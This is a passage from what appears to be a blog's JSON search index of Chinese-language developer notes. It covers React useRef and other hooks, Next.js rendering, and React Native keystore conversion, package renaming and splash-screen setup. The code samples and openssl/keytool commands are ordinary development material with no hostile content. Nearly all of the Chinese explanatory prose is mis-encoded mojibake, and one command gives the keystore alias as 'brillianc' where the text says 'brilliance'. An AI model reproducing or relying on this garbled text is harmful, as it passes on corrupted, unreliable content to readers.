ã€‚è¿™åˆ† 3 ä¸ªæ­¥éª¤æ‰§è¡Œï¼š\n å®šä¹‰è®¿é—®å…ƒç´ çš„ref const elementRef = useRef()ï¼› å°†refåˆ†é…ç»™refå…ƒç´ çš„å±æ€§ï¼š\u0026lt;div ref={elementRef}\u0026gt;\u0026lt;/div\u0026gt;; æŒ‚è½½åï¼ŒelementRef.currentæŒ‡å‘DOMå…ƒç´ ã€‚  import { useRef, useEffect } from \u0026#39;react\u0026#39;;\rfunction AccessingElement() {\rconst elementRef = useRef();\ruseEffect(() =\u0026gt; {\rconst divElement = elementRef.current;\rconsole.log(divElement); // logs \u0026lt;div\u0026gt;I\u0026#39;m an element\u0026lt;/div\u0026gt;\r}, []);\rreturn (\r\u0026lt;div ref={elementRef}\u0026gt;\rI\u0026#39;m an element\r\u0026lt;/div\u0026gt;\r);\r} ç”¨ä¾‹ï¼šèšç„¦è¾“å…¥ è®¿é—® DOM å…ƒç´ ï¼Œä»¥ä¾¿åœ¨ç»„ä»¶æŒ‚è½½æ—¶å…³æ³¨è¾“å…¥å­—æ®µã€‚\nè¦ä½¿å…¶å·¥ä½œï¼Œéœ€è¦åˆ›å»ºå¯¹è¾“å…¥çš„refï¼Œå°†refåˆ†é…ç»™æ ‡ç­¾çš„refå±æ€§ï¼Œå¹¶åœ¨å®‰è£…åè°ƒç”¨element.focus()å…ƒç´ ä¸Šçš„ç‰¹æ®Šæ–¹æ³•ã€‚\nè¿™æ˜¯è¯¥\u0026lt;InputFocus\u0026gt;ç»„ä»¶çš„å¯èƒ½å®ç°ï¼š\nimport { useRef, useEffect } from \u0026#39;react\u0026#39;;\rfunction InputFocus() {\rconst inputRef = useRef();\ruseEffect(() =\u0026gt; {\rinputRef.current.focus();\r}, []);\rreturn (\r\u0026lt;input ref={inputRef} type=\u0026#34;text\u0026#34; /\u0026gt;\r);\r} const inputRef = useRef() åˆ›å»ºä¸€ä¸ªrefæ¥ä¿å­˜è¾“å…¥å…ƒç´ ã€‚\nç„¶åinputRefåˆ†é…ç»™è¾“å…¥å­—æ®µçš„å±æ€§refï¼š\u0026lt;input ref={inputRef} type=\u0026quot;text\u0026quot; /\u0026gt;ã€‚\nç„¶åï¼Œåœ¨å®‰è£…åï¼Œè®¾ç½®inputRef.currentä¸ºè¾“å…¥å…ƒç´ ã€‚ç°åœ¨ï¼Œå¯ä»¥é€šè¿‡ç¼–ç¨‹å°†ç„¦ç‚¹è®¾ç½®è¾“å…¥åˆ°ï¼šinputRef.current.focus()ã€‚\nRef åœ¨åˆå§‹æ¸²æŸ“æ—¶ä¸ºç©º åœ¨åˆå§‹æ¸²æŸ“æœŸé—´ï¼Œä¿å­˜ DOM å…ƒç´ çš„refåº”è¯¥æ˜¯ç©ºçš„ï¼š\nimport { useRef, useEffect } from \u0026#39;react\u0026#39;;\rfunction InputFocus() {\rconst inputRef = useRef();\ruseEffect(() =\u0026gt; {\r// Logs `HTMLInputElement` console.log(inputRef.current);\rinputRef.current.focus();\r}, []);\r// Logs `undefined` during initial rendering\rconsole.log(inputRef.current);\rreturn \u0026lt;input ref={inputRef} type=\u0026#34;text\u0026#34; /\u0026gt;;\r} åœ¨åˆå§‹æ¸²æŸ“æœŸé—´ï¼ŒReact ä»ä¸ç¡®å®šç»„ä»¶çš„è¾“å‡ºæ˜¯ä»€ä¹ˆï¼Œå› æ­¤è¿˜æ²¡æœ‰åˆ›å»º DOM ç»“æ„ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨åˆå§‹æ¸²æŸ“æœŸé—´inputRef.currentè¯„ä¼°ä¸ºundefinedã€‚\nuseEffect(callback, []) å½“è¾“å…¥å…ƒç´ å·²ç»åœ¨ DOM ä¸­åˆ›å»ºæ—¶ï¼Œé’©å­åœ¨æŒ‚è½½åç«‹å³è°ƒç”¨å›è°ƒã€‚\ncallbackçš„å‡½æ•°useEffect(callback, [])ä½¿inputRef.currentè®¿é—®çš„æ­£ç¡®ä½ç½®ï¼Œå› ä¸ºå®ƒå¯ä»¥ä¿è¯æ„å»º DOMã€‚\n3). æ›´æ–°refé™åˆ¶ åŠŸèƒ½ç»„ä»¶çš„åŠŸèƒ½èŒƒå›´åº”è¯¥è®¡ç®—è¾“å‡ºæˆ–è°ƒç”¨é’©å­ã€‚\nè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸åº”è¯¥åœ¨ç»„ä»¶åŠŸèƒ½çš„ç›´æ¥èŒƒå›´å†…æ‰§è¡Œæ›´æ–°refï¼ˆä»¥åŠæ›´æ–°stateï¼‰çš„åŸå› ã€‚\nå¿…é¡»åœ¨useEffect()å›è°ƒæˆ–å¤„ç†ç¨‹åºï¼ˆäº‹ä»¶å¤„ç†ç¨‹åºã€è®¡æ—¶å™¨å¤„ç†ç¨‹åºç­‰ï¼‰å†…éƒ¨æ›´æ–°refã€‚\nimport { useRef, useEffect } from \u0026#39;react\u0026#39;;\rfunction MyComponent({ prop }) {\rconst myRef = useRef(0);\ruseEffect(() =\u0026gt; {\rmyRef.current++; // Good!\rsetTimeout(() =\u0026gt; {\rmyRef.current++; // Good!\r}, 1000);\r}, []);\rconst handler = () =\u0026gt; {\rmyRef.current++; // Good!\r};\rmyRef.current++; // Bad!\rif (prop) {\rmyRef.current++; // Bad!\r}\rreturn \u0026lt;button onClick={handler}\u0026gt;My button\u0026lt;/button\u0026gt;;\r} 4). æ€»ç»“ useRef() é’©å­åˆ›å»ºå¼•ç”¨ã€‚\nconst reference = useRef(initialValue)ä½¿ç”¨åˆå§‹å€¼è°ƒç”¨ä¼šè¿”å›ä¸€ä¸ªåä¸º reference çš„ç‰¹æ®Šå¯¹è±¡ã€‚\nrefå¯¹è±¡æœ‰ä¸€ä¸ªå±æ€§currentï¼šä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªå±æ€§æ¥è¯»å–refå€¼reference.currentï¼Œæˆ–è€…æ›´æ–°reference.current = newValueã€‚\nåœ¨ç»„ä»¶é‡æ–°æ¸²æŸ“ä¹‹é—´ï¼Œå¼•ç”¨çš„å€¼æ˜¯æŒä¹…çš„ã€‚\nä¸æ›´æ–°çŠ¶æ€ç›¸åï¼Œæ›´æ–°å¼•ç”¨ä¸ä¼šè§¦å‘ç»„ä»¶é‡æ–°æ¸²æŸ“ã€‚\nå¼•ç”¨ä¹Ÿå¯ä»¥è®¿é—® DOM å…ƒç´ ã€‚å°†å¼•ç”¨åˆ†é…ç»™refæ‚¨è¦è®¿é—®çš„å…ƒç´ çš„å±æ€§ï¼š\u0026lt;div ref={reference}\u0026gt;Element\u0026lt;/div\u0026gt;â€” è¯¥å…ƒç´ ä½äºreference.currentã€‚\n8. useImperativeHandle useImperativeHandle(ref, createHandle, [deps]) useImperativeHandle å¯ä»¥è®©ä½ åœ¨ä½¿ç”¨ ref æ—¶è‡ªå®šä¹‰æš´éœ²ç»™çˆ¶ç»„ä»¶çš„å®ä¾‹å€¼ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œåº”å½“é¿å…ä½¿ç”¨ ref è¿™æ ·çš„å‘½ä»¤å¼ä»£ç ã€‚\nuseImperativeHandle åº”å½“ä¸ forwardRef ä¸€èµ·ä½¿ç”¨ï¼š\nfunction FancyInput(props, ref) {\rconst inputRef = useRef();\ruseImperativeHandle(ref, () =\u0026gt; ({\rfocus: () =\u0026gt; {\rinputRef.current.focus();\r}\r}));\rreturn \u0026lt;input ref={inputRef} ... /\u0026gt;;\r}\rFancyInput = forwardRef(FancyInput); åœ¨æœ¬ä¾‹ä¸­ï¼Œæ¸²æŸ“ \u0026lt;FancyInput ref={inputRef} /\u0026gt; çš„çˆ¶ç»„ä»¶å¯ä»¥è°ƒç”¨ inputRef.current.focus()ã€‚\n9. useDebugValue useDebugValue(value) useDebugValue å¯ç”¨äºåœ¨ React å¼€å‘è€…å·¥å…·ä¸­æ˜¾ç¤ºè‡ªå®šä¹‰ hook çš„æ ‡ç­¾ã€‚\nä¾‹å¦‚ï¼Œè‡ªå®šä¹‰ Hook ç« èŠ‚ä¸­æè¿°çš„åä¸º useFriendStatus çš„è‡ªå®šä¹‰ Hookï¼š\nfunction useFriendStatus(friendID) {\rconst [isOnline, setIsOnline] = useState(null);\r// ...\r// åœ¨å¼€å‘è€…å·¥å…·ä¸­çš„è¿™ä¸ª Hook æ—è¾¹æ˜¾ç¤ºæ ‡ç­¾\r// e.g. \u0026#34;FriendStatus: Online\u0026#34;\ruseDebugValue(isOnline ? \u0026#39;Online\u0026#39; : \u0026#39;Offline\u0026#39;);\rreturn isOnline;\r} React ä¸æ¨èä½ å‘æ¯ä¸ªè‡ªå®šä¹‰ Hook æ·»åŠ  debug å€¼ã€‚å½“å®ƒä½œä¸ºå…±äº«åº“çš„ä¸€éƒ¨åˆ†æ—¶æ‰æœ€æœ‰ä»·å€¼ã€‚\nå»¶è¿Ÿæ ¼å¼åŒ– debug å€¼ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ ¼å¼åŒ–å€¼çš„æ˜¾ç¤ºå¯èƒ½æ˜¯ä¸€é¡¹å¼€é”€å¾ˆå¤§çš„æ“ä½œã€‚é™¤ééœ€è¦æ£€æŸ¥ Hookï¼Œå¦åˆ™æ²¡æœ‰å¿…è¦è¿™ä¹ˆåšã€‚\nå› æ­¤ï¼ŒuseDebugValue æ¥å—ä¸€ä¸ªæ ¼å¼åŒ–å‡½æ•°ä½œä¸ºå¯é€‰çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚\nè¯¥å‡½æ•°åªæœ‰åœ¨ Hook è¢«æ£€æŸ¥æ—¶æ‰ä¼šè¢«è°ƒç”¨ã€‚å®ƒæ¥å— debug å€¼ä½œä¸ºå‚æ•°ï¼Œå¹¶ä¸”ä¼šè¿”å›ä¸€ä¸ªæ ¼å¼åŒ–çš„æ˜¾ç¤ºå€¼ã€‚\nä¾‹å¦‚ï¼Œä¸€ä¸ªè¿”å› Date å€¼çš„è‡ªå®šä¹‰ Hook å¯ä»¥é€šè¿‡æ ¼å¼åŒ–å‡½æ•°æ¥é¿å…ä¸å¿…è¦çš„ toDateString å‡½æ•°è°ƒç”¨ï¼š\nuseDebugValue(date, date =\u0026gt; date.toDateString()); ","description":"Hook æ˜¯ React 16.8 çš„æ–°å¢ç‰¹æ€§ã€‚å®ƒå¯ä»¥åœ¨ä¸ç¼–å†™ class çš„æƒ…å†µä¸‹ä½¿ç”¨ state ä»¥åŠå…¶ä»–çš„ React ç‰¹æ€§","id":40,"section":"react","tags":null,"title":"Hooks æœ€ä½³å®è·µ","uri":"https://codthing.github.io/react/hooks/hooks-bp/"},{"content":"ä¸€ã€æ¸²æŸ“ å°† React ä¸­ç¼–å†™çš„ä»£ç è½¬æ¢ä¸º UI çš„ HTML è¡¨ç¤ºå½¢å¼æ˜¯ä¸å¯é¿å…çš„å·¥ä½œå•å…ƒã€‚\nè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºæ¸²æŸ“ã€‚\n1. é¢„æ¸²æŸ“ï¼ˆé»˜è®¤ï¼‰ a. æœåŠ¡å™¨ç«¯æ¸²æŸ“  getServerSideProps React 18 å’Œ Next 12 å¼•å…¥äº†React æœåŠ¡å™¨ç»„ä»¶çš„ alpha ç‰ˆæœ¬ã€‚\næœåŠ¡å™¨ç»„ä»¶å®Œå…¨åœ¨æœåŠ¡å™¨ä¸Šå‘ˆç°ï¼Œä¸éœ€è¦å®¢æˆ·ç«¯ JavaScript æ¥å‘ˆç°ã€‚\næ­¤å¤–ï¼ŒæœåŠ¡å™¨ç»„ä»¶å…è®¸å¼€å‘äººå‘˜åœ¨æœåŠ¡å™¨ä¸Šä¿ç•™ä¸€äº›é€»è¾‘ï¼Œå¹¶ä¸”åªå°†è¯¥é€»è¾‘çš„ç»“æœå‘é€ç»™å®¢æˆ·ç«¯ã€‚\nè¿™å‡å°‘äº†å‘é€åˆ°å®¢æˆ·ç«¯çš„åŒ…å¤§å°å¹¶æé«˜äº†å®¢æˆ·ç«¯æ¸²æŸ“æ€§èƒ½ã€‚  b. é™æ€ç«™ç‚¹ç”Ÿæˆ é€‚åˆæ²¡æœ‰äº¤äº’çš„é¡µé¢ï¼Œä¾‹å¦‚æ–°é—»åšå®¢ç­‰\n getStaticProps å¯ä»¥åœ¨æ„å»ºç«™ç‚¹åä½¿ç”¨\nå¢é‡é™æ€é‡æ–°\nç”Ÿæˆæ¥åˆ›å»ºæˆ–æ›´æ–°é™æ€é¡µé¢ ã€‚è¿™æ„å‘³ç€å¦‚æœæ‚¨çš„æ•°æ®å‘ç”Ÿå˜åŒ–ï¼Œä¸å¿…é‡å»ºæ•´ä¸ªç«™ç‚¹ã€‚  2. å®¢æˆ·ç«¯æ¸²æŸ“ åˆå§‹æ¸²æŸ“å·¥ä½œå‘ç”Ÿåœ¨ç”¨æˆ·è®¾å¤‡ä¸Šï¼Œç‰¹å®šç»„ä»¶ä½¿ç”¨å®¢æˆ·ç«¯æ¸²æŸ“ã€‚\n useEffect() useSWR  äºŒã€ä»£ç å­˜å‚¨çš„ä½ç½®å’Œè¿è¡Œçš„ç½‘ç»œ 1. æºæœåŠ¡å™¨ å½“æºæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨å‘é€å“åº”ä¹‹å‰è¿›è¡Œä¸€äº›è®¡ç®—ã€‚\nè¯¥è®¡ç®—å·¥ä½œçš„ç»“æœå¯ä»¥ç§»åŠ¨åˆ° CDNï¼ˆå†…å®¹äº¤ä»˜ç½‘ç»œï¼‰ã€‚\n2. å†…å®¹äº¤ä»˜ç½‘ç»œï¼ˆCDNï¼‰ CDN å°†é™æ€å†…å®¹ï¼ˆä¾‹å¦‚ HTML å’Œå›¾åƒæ–‡ä»¶ï¼‰å­˜å‚¨åœ¨ä¸–ç•Œå„åœ°çš„å¤šä¸ªä½ç½®ï¼Œå¹¶æ”¾ç½®åœ¨å®¢æˆ·ç«¯å’ŒæºæœåŠ¡å™¨ä¹‹é—´ã€‚\nå½“æœ‰æ–°è¯·æ±‚è¿›æ¥æ—¶ï¼Œç¦»ç”¨æˆ·æœ€è¿‘çš„ CDN ä½ç½®å¯ä»¥ç”¨ç¼“å­˜çš„ç»“æœè¿›è¡Œå“åº”ã€‚\n3. è¾¹ç¼˜ï¼ˆæ¨èï¼‰ ä¸ CDN ç±»ä¼¼ï¼Œè¾¹ç¼˜æœåŠ¡å™¨åˆ†å¸ƒåœ¨ä¸–ç•Œå„åœ°çš„å¤šä¸ªä½ç½®ã€‚ä½†ä¸å­˜å‚¨é™æ€å†…å®¹çš„ CDN ä¸åŒï¼Œä¸€äº›è¾¹ç¼˜æœåŠ¡å™¨å¯ä»¥è¿è¡Œä»£ç ã€‚\nè¿™æ„å‘³ç€ç¼“å­˜å’Œä»£ç æ‰§è¡Œéƒ½å¯ä»¥åœ¨é è¿‘ç”¨æˆ·çš„è¾¹ç¼˜å®Œæˆã€‚\n åœ¨ Next.js ä¸­ï¼Œå¯ä»¥ä½¿ç”¨Middlewareåœ¨è¾¹ç¼˜è¿è¡Œä»£ç ï¼Œ\nå¾ˆå¿«å°±ä¼šä½¿ç”¨React Server Componentsã€‚  ","description":"Next.js çš„å…³é”®æ€§å†…å®¹","id":41,"section":"react","tags":null,"title":"Next.js æ ¸å¿ƒå·¥ä½œå†…å®¹","uri":"https://codthing.github.io/react/next/next-content/"},{"content":"ä¸€ã€å°†.pk8 å’Œ.pem è½¬æ¢æˆ react-native çš„ debug.keystore Step1. å®‰è£… openssl\nå‚è€ƒï¼šhttps://stackoverflow.com/questions/42918916/npm-install-openssl-failed-on-windows-10\nStep2. æŠŠ pkcs8 æ ¼å¼çš„ç§é’¥è½¬æ¢ä¸º pkcs12 æ ¼å¼ï¼Œç”Ÿæˆ platform.priv.pem æ–‡ä»¶\nopenssl pkcs8 -in platform.pk8 -inform DER -outform PEM -out platform.priv.pem -nocrypt Step3. ç”Ÿæˆ pkcs12 æ ¼å¼çš„å¯†é’¥æ–‡ä»¶,ç”Ÿæˆ platform.pk12 æ–‡ä»¶ï¼Œæœ€åçš„ brilliance æ˜¯ keystore çš„ aliasï¼Œéœ€è¦è¾“å…¥ä¸¤æ¬¡å¯†ç ï¼Œæˆ‘ä»¬è¿™é‡Œé»˜è®¤ä¸º android\nopenssl pkcs12 -export -in platform.x509.pem -inkey platform.priv.pem -out platform.pk12 -name brilliance Step4. ç”Ÿæˆ platform.keystore\nkeytool -importkeystore -deststorepass android -destkeypass android -destkeystore platform.keystore -srckeystore platform.pk12 -srcstoretype PKCS12 -srcstorepass android -alias brillianc äºŒã€React-Native é‡å‘½å package \u0026amp; é‡å‘½å app 1. é‡å‘½å package  Step1. é‡å‘½åæ–‡ä»¶å¤¹\n android/app/src/main/java/MY/APP/OLD_ID/ é‡å‘½åä¸ºï¼š android/app/src/ main/java/MY/APP/NEW_ID/\n è¿™é‡Œçš„ NEW_ID ä¹Ÿå¯èƒ½æ˜¯å¤šçº§æ–‡ä»¶å¤¹ï¼Œä¾‹å¦‚ï¼š com/fungmo/a08\n  Step2. é…ç½®åŒ… ID\n 1.åœ¨ android/app/src/main/java/MY/APP/NEW_ID/MainActivity.java ä¸­ï¼š\npackage MY.APP.NEW_ID; //è¿™é‡Œçš„ MY.APP.NEW_ID é¡¹ç›®ä¸­ä¸ºä¾‹å¦‚ com.fungmo.a08 2.åœ¨ android/app/src/main/java/MY/APP/NEW_ID/MainApplication.java ä¸­ï¼š\npackage MY.APP.NEW_ID; //è¿™é‡Œçš„ MY.APP.NEW_ID é¡¹ç›®ä¸­ä¸ºä¾‹å¦‚ com.fungmo.a08\rimport MY.APP.NEW_ID.generated.BasePackageList; //è¿™é‡Œçš„ MY.APP.NEW_ID é¡¹ç›®ä¸­ä¸ºä¾‹å¦‚ com.fungmo.a08\rClass\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;MY.APP.NEW_ID.ReactNativeFlipper\u0026#34;); //è¿™é‡Œçš„ MY.APP.NEW_ID é¡¹ç›®ä¸­ä¸ºä¾‹å¦‚ com.fungmo.a08 3.åœ¨ android/app/src/main/AndroidManifest.xml ä¸­ï¼š\npackage=\u0026#34;MY.APP.NEW_ID\u0026#34; //è¿™é‡Œçš„ MY.APP.NEW_ID é¡¹ç›®ä¸­ä¸ºä¾‹å¦‚ com.fungmo.a08 4.åœ¨ android/app/build.gradle ä¸­ï¼š\napplicationId \u0026#34;MY.APP.NEW_ID\u0026#34; //è¿™é‡Œçš„ MY.APP.NEW_ID é¡¹ç›®ä¸­ä¸ºä¾‹å¦‚ com.fungmo.a08 5.åœ¨ android/app/BUCK ä¸­ï¼š\nandroid_build_config(\rpackage=\u0026#34;MY.APP.NEW_ID\u0026#34; //è¿™é‡Œçš„ MY.APP.NEW_ID é¡¹ç›®ä¸­ä¸ºä¾‹å¦‚ com.fungmo.a08\r)\randroid_resource(\rpackage=\u0026#34;MY.APP.NEW_ID\u0026#34; //è¿™é‡Œçš„ MY.APP.NEW_ID é¡¹ç›®ä¸­ä¸ºä¾‹å¦‚ com.fungmo.a08\r)  Step3. æœ€åè¿›è¡Œ Gradle æ¸…ç†ï¼ˆåœ¨ /android æ–‡ä»¶å¤¹ä¸­ï¼‰ï¼š\n gradlew clean //cmd\r//æˆ–è€…\r./gradlew clean //powershell 2ã€é‡å‘½å app ç”Ÿæˆå™¨ä¸ä¼šè¦†ç›–ä½äº android/app/src/main/res/values/ æ–‡ä»¶å¤¹ä¸­çš„ strings.xml æ–‡ä»¶ï¼Œå› æ­¤å¿…é¡» æ‰‹åŠ¨æ›´æ”¹ app_name å˜é‡\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt;\r\u0026lt;resources\u0026gt;\r\u0026lt;string name=\u0026#34;app_name\u0026#34;\u0026gt;ç”¨æˆ·æ‰‹å†Œ\u0026lt;/string\u0026gt;\r\u0026lt;/resources\u0026gt; ä¸‰ã€RN å¯åŠ¨å± npm i react-native-splash-screen --save  é…ç½®å‚è€ƒ\n Step1. è½¬åˆ°app/src/main/java/[packageName]å¹¶åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶SplashActivity.javaç„¶åå°†ä»¥ä¸‹ä»£ç å¤åˆ¶ç²˜è´´åˆ°å…¶ä¸­ã€‚\npackage com.packagename; // Replace this with your package name æ›¿æ¢ä¸ºè‡ªå·±çš„ package å\rimport android.content.Intent;\rimport android.os.Bundle;\rimport androidx.appcompat.app.AppCompatActivity;\rpublic class SplashActivity extends AppCompatActivity {\r@Override\rprotected void onCreate(Bundle savedInstanceState) {\rsuper.onCreate(savedInstanceState);\rIntent intent = new Intent(this, MainActivity.class);\rstartActivity(intent);\rfinish();\r}\r} Step2. å»app/src/main/AndroidManifest.xmlå’Œä¿®æ”¹å®ƒï¼Œå¦‚ä¸‹æ‰€ç¤ºä½¿ç”¨SplashActivityï¼š åœ¨\u0026lt;application\u0026gt;æ ‡ç­¾å†…æ·»åŠ ä»¥ä¸‹æ´»åŠ¨ã€‚\n\u0026lt;activity\randroid:name=\u0026#34;.SplashActivity\u0026#34;\randroid:theme=\u0026#34;@style/SplashTheme\u0026#34;\randroid:label=\u0026#34;@string/app_name\u0026#34;\r\u0026gt;\r\u0026lt;intent-filter\u0026gt;\r\u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34; /\u0026gt;\r\u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34; /\u0026gt;\r\u0026lt;/intent-filter\u0026gt;\r\u0026lt;/activity\u0026gt; ä»MainActivityæ ‡ç­¾ä¸­åˆ é™¤ä»¥ä¸‹æ„å›¾ã€‚\n\u0026lt;intent-filter\u0026gt;\r\u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34; /\u0026gt;\r\u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34; /\u0026gt;\r\u0026lt;/intent-filter\u0026gt; å¹¶æ·»åŠ android:exported=\u0026quot;true\u0026quot;è¯¥æ´»åŠ¨ã€‚ ç°åœ¨ï¼Œæ‚¨çš„AndroidManifest.xmlåº”è¯¥å¦‚ä¸‹æ‰€ç¤ºï¼š\n\u0026lt;manifest xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\rpackage=\u0026#34;com.packagename\u0026#34;\u0026gt;\r\u0026lt;uses-permission android:name=\u0026#34;android.permission.INTERNET\u0026#34; /\u0026gt;\r\u0026lt;application\randroid:name=\u0026#34;.MainApplication\u0026#34;\randroid:label=\u0026#34;@string/app_name\u0026#34;\randroid:icon=\u0026#34;@mipmap/ic_launcher\u0026#34;\randroid:roundIcon=\u0026#34;@mipmap/ic_launcher\u0026#34;\randroid:allowBackup=\u0026#34;false\u0026#34;\randroid:theme=\u0026#34;@style/AppTheme\u0026#34;\u0026gt;\r\u0026lt;activity\randroid:name=\u0026#34;.SplashActivity\u0026#34;\randroid:theme=\u0026#34;@style/SplashTheme\u0026#34;\randroid:label=\u0026#34;@string/app_name\u0026#34;\r\u0026gt;\r\u0026lt;intent-filter\u0026gt;\r\u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34; /\u0026gt;\r\u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34; /\u0026gt;\r\u0026lt;/intent-filter\u0026gt;\r\u0026lt;/activity\u0026gt;\r\u0026lt;activity\randroid:name=\u0026#34;.MainActivity\u0026#34;\randroid:label=\u0026#34;@string/app_name\u0026#34;\randroid:configChanges=\u0026#34;keyboard|keyboardHidden|orientation|screenSize|uiMode\u0026#34;\randroid:launchMode=\u0026#34;singleTask\u0026#34;\randroid:windowSoftInputMode=\u0026#34;adjustResize\u0026#34;\randroid:exported=\u0026#34;true\u0026#34;\r\u0026gt;\r\u0026lt;/activity\u0026gt;\r\u0026lt;activity android:name=\u0026#34;com.facebook.react.devsupport.DevSettingsActivity\u0026#34; /\u0026gt;\r\u0026lt;/application\u0026gt;\r\u0026lt;/manifest\u0026gt; Step3. ç°åœ¨ï¼Œæˆ‘ä»¬å°†å£°æ˜SplashThemefor SplashActivityã€‚è½¬åˆ°app/src/main/res/values/styles.xmlå¹¶åœ¨\u0026lt;resources\u0026gt;ä¸­æ·»åŠ ä»¥ä¸‹æ ·å¼ã€‚\n\u0026lt;style name=\u0026#34;SplashTheme\u0026#34; parent=\u0026#34;Theme.AppCompat.Light.NoActionBar\u0026#34;\u0026gt;\r\u0026lt;item name=\u0026#34;android:background\u0026#34;\u0026gt;@drawable/background_splash\u0026lt;/item\u0026gt;\r\u0026lt;item name=\u0026#34;android:statusBarColor\u0026#34;\u0026gt;@color/background\u0026lt;/item\u0026gt;\r\u0026lt;/style\u0026gt; Step4. è½¬åˆ°android\\app\\src\\main\\res\\valueså¹¶åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼ˆcolors.xmlå¦‚æœå°šä¸å­˜åœ¨ï¼‰ã€‚ æˆ‘ä»¬åœ¨ä¸Šé¢ä½¿ç”¨äº†èƒŒæ™¯é¢œè‰²å¸¸é‡ï¼Œå› æ­¤å¿…é¡»å°†å…¶æ·»åŠ åˆ°colors.xmlæ–‡ä»¶ä¸­ã€‚\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt;\r\u0026lt;resources\u0026gt;\r\u0026lt;!-- Insert your background color for the splash screen --\u0026gt;\r\u0026lt;color name=\u0026#34;background\u0026#34;\u0026gt;#fff\u0026lt;/color\u0026gt;\r\u0026lt;/resources\u0026gt; Step5. è½¬åˆ°android/app/src/main/res/drawableï¼ˆå¦‚æœå°šä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºdrawableæ–‡ä»¶å¤¹ï¼‰å¹¶å°†æ‚¨çš„å¯åŠ¨å±å¹•å›¾åƒï¼ˆåç§°åº”ä¸ºsplash_screen.pngï¼‰æ”¾åœ¨æ­¤å¤„ï¼Œå¹¶background_splash.xmlä½¿ç”¨ä»¥ä¸‹ä»£ç åˆ›å»ºæ–‡ä»¶ï¼š\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt;\r\u0026lt;layer-list xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt;\r\u0026lt;item android:drawable=\u0026#34;@color/background\u0026#34; /\u0026gt;\r\u0026lt;item\randroid:drawable=\u0026#34;@drawable/splash_screen\u0026#34;\randroid:height=\u0026#34;300dp\u0026#34;\randroid:width=\u0026#34;300dp\u0026#34;\randroid:gravity=\u0026#34;center\u0026#34;\r/\u0026gt;\r\u0026lt;/layer-list\u0026gt; å¦‚æœæ‚¨çš„åˆå§‹å±å¹•çš„å°ºå¯¸æ˜¯ç­‰äºè®¾å¤‡å±å¹•çš„å°ºå¯¸ï¼Œåœ¨\u0026lt;item\u0026gt;æ ‡ç­¾ä¸­åˆ é™¤android:heightå’Œandroid:widthã€‚\nStep6. react-native-splash-screenåœ¨æ‚¨çš„é¡¹ç›®ä¸­å®‰è£…æ¨¡å—ï¼Œç„¶åSplashScreenä» App.js æ–‡ä»¶ä¸­å¯¼å…¥å®ƒã€‚ import SplashScreen from 'react-native-splash-screen'; æˆ‘ä»¬åªéœ€è¦æ˜¾ç¤ºåˆå§‹å±å¹•ï¼Œç›´åˆ°å®‰è£…ç¬¬ä¸€ä¸ªç»„ä»¶ï¼Œç„¶åuseEffectåœ¨ App ç»„ä»¶ä¸»ä½“å†…ï¼ˆè¿”å›ä¹‹å‰ï¼‰åˆ¶ä½œä¸€ä¸ªé’©å­ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š ä¸è¦å¿˜äº†import useEffect from 'react'ã€‚\nuseEffect(() =\u0026gt; {\rSplashScreen.hide();\r}, []); Step7. è½¬åˆ°app/src/main/java/[packageName]/MainActivity.javaå¹¶å¯¼å…¥ä»¥ä¸‹æ¨¡å—ï¼Œç„¶åå¯¼å…¥å…¶ä»–æ¨¡å—ã€‚\nimport org.devio.rn.splashscreen.SplashScreen;\rimport android.os.Bundle; å°†æ­¤æ–¹æ³•æ·»åŠ åˆ°MainActivityç±»çš„é¡¶éƒ¨ã€‚\n@Override\rprotected void onCreate(Bundle savedInstanceState) {\rSplashScreen.show(this, R.style.SplashStatusBarTheme);\rsuper.onCreate(savedInstanceState);\r} Step8. å»android/app/src/main/res/values/styles.xmlæ·»åŠ SplashStatusBarThemeï¼Œå°±åƒæˆ‘ä»¬åœ¨ç¬¬ 3 æ­¥ä¸€æ ·ã€‚\n\u0026lt;style name=\u0026#34;SplashStatusBarTheme\u0026#34; parent=\u0026#34;SplashScreen_SplashTheme\u0026#34;\u0026gt;\r\u0026lt;item name=\u0026#34;android:statusBarColor\u0026#34;\u0026gt;@color/background\u0026lt;/item\u0026gt;\r\u0026lt;/style\u0026gt; å¦‚æœä¸è¿™æ ·åšï¼Œåˆ™åœ¨åŠ è½½åº”ç”¨ç¨‹åºçš„ JS ä»£ç æ—¶ï¼ŒStatusBar çš„é¢œè‰²å°†å˜ä¸ºé»‘è‰²ã€‚\nStep9. è½¬åˆ°android/app/src/main/res/å¹¶åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶å¤¹layoutï¼ˆå¦‚æœå°šä¸å­˜åœ¨ï¼‰ã€‚åœ¨è¯¥æ–‡ä»¶å¤¹ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶launch_screen.xmlï¼ˆï¼Œéœ€è¦æ­¤æ–‡ä»¶react-native-splash-screen 